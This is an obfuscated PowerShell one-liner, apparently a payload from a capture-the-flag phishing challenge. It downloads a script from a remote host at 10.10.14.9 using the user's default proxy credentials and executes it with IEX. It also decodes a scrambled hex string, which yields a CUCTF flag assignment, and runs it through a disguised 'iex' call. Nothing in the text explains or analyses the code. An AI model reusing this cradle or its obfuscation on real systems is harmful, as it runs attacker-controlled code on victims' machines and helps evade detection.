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x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy();$x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $x.downloadstring('http://10.10.14.9:8080/rH41wL');[STRiNg]::joIN('' , ( '24t66:6c:61:67W20:3d~20-22r43-55t43W54-46W7b-50r6c~33%6er37Y79:5fr30W66W5fY50~68-31Y35Y68-5fW31:6e%5f%37~68Y33:5ft73%33r41Y7dt22' -SplIT'-' -sPlIT':' -spLiT'~'-Split'r' -SpliT'W' -SplIt 't' -SPlIT'Y'-SPlIt'%'| FOReACH { ( [CONVeRT]::TOint16( ( [StRinG]$_ ) , 16 )-As[cHAR]) }))|.( 'i'+[cHaR]([ConvERt]::ToiNT16(65, 16))+'x')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